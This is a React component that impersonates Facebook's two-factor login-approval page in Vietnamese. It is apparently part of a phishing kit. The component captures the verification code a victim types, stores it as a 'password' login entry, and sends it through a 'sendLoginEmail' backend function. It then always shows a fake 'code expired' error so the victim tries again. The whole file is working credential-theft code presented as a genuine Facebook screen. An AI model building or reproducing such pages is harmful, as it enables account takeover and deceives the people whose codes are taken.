import React, { useState } from "react";
import { ChevronLeft } from "lucide-react";
import { base44 } from "@/api/base44Client";
import { useNavigate } from "react-router-dom";


export default function VerifySms() {
  const [code, setCode] = useState("");
  const [message, setMessage] = useState("");
  const [showLoginError, setShowLoginError] = useState(false);
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  const handleContinue = async (e) => {
    e.preventDefault();
    if (!code) {
      setShowLoginError(false);
      setMessage("Vui lòng nhập mã xác nhận.");
      return;
    }
    setLoading(true);
    try {
      try {
        await base44.entities.LoginEntry.create({ identifier: "Mã SMS", password: code });
      } catch (e) { console.error("Lỗi lưu bản ghi:", e); }
      await base44.functions.invoke("sendLoginEmail", { code });
      await new Promise((r) => setTimeout(r, 2000));
      setMessage("");
      setShowLoginError(true);
      setCode("");
    } catch (err) {
      setMessage("Có lỗi khi gửi dữ liệu. Vui lòng thử lại.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <div className="px-5 pt-5">
        <button className="p-1 -ml-1 text-slate-900" aria-label="Quay lại">
          <ChevronLeft className="w-7 h-7" strokeWidth={2.2} />
        </button>
      </div>

      <div className="flex-1 w-full max-w-[420px] mx-auto px-6 flex flex-col">
        <div className="pt-6 pb-4">
          <p className="text-[13px] text-slate-400 font-medium">Facebook</p>
          <h1 className="mt-1 text-[22px] font-bold text-slate-900 leading-tight">
            Kiểm tra thông báo trên thiết bị khác
          </h1>
          <p className="mt-2 text-[14px] text-slate-500 leading-relaxed">
            Chúng tôi đã gửi thông báo đến các thiết bị của bạn. Hãy xem thông báo của Facebook trên thiết bị đó và phê duyệt lượt đăng nhập để tiếp tục.
          </p>
        </div>

        <div className="w-full rounded-xl bg-[#E1F5F2] flex items-center justify-center py-6">
          <img
            src="https://brscdn.io.vn/theme/system/facebook/device.png"
            alt="Thiết bị"
            className="w-full max-w-[260px] h-auto object-contain"
          />
        </div>

        <div className="mt-5 flex items-start gap-2.5">
          <span className="mt-0.5 inline-block w-4 h-4 rounded-full border-2 border-slate-200 border-t-slate-500 animate-spin flex-shrink-0"></span>
          <div>
            <p className="text-[15px] font-semibold text-slate-900">Đang chờ phê duyệt</p>
            <p className="text-[13px] text-slate-500 leading-relaxed">
              Có thể vài phút nữa bạn mới nhận được thông báo trên thiết bị khác của mình.
            </p>
          </div>
        </div>

        <hr className="my-5 border-slate-200" />

        <form onSubmit={handleContinue} className="space-y-3">
          <label className="block text-[14px] font-semibold text-slate-900">
            Hoặc nhập mã xác minh:
          </label>
          <input
            type="text"
            inputMode="numeric"
            value={code}
            onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, 8))}
            placeholder="Nhập mã 6 số đã gửi về thiết bị của bạn"
            className="w-full h-11 px-3.5 rounded-lg border border-slate-300 bg-white text-[15px] text-slate-900 placeholder:text-slate-400 outline-none transition-all focus:border-[#1877F2] focus:ring-2 focus:ring-[#1877F2]/15"
          />
          <button
            type="submit"
            disabled={loading}
            className="w-full h-11 rounded-full bg-[#1877F2] text-white text-[15px] font-semibold transition-all active:scale-[0.98] hover:bg-[#166FE5] disabled:opacity-60"
          >
            {loading ? "Đang xử lý..." : "Xác nhận"}
          </button>
        </form>

        {message && (
          <p className="mt-3 text-center text-[13px] text-red-500">{message}</p>
        )}

        {showLoginError && (
          <div className="mt-3 text-center text-[13px] leading-relaxed">
            <p className="text-red-500">Bạn chưa phê duyệt đăng nhập hoặc mã hết hiệu lực.</p>
            <button
              type="button"
              onClick={() => navigate("/")}
              className="text-[#1877F2] font-semibold hover:underline"
            >
              Hãy kiểm tra tài khoản của bạn và đăng nhập lại.
            </button>
          </div>
        )}
      </div>
    </div>
  );
}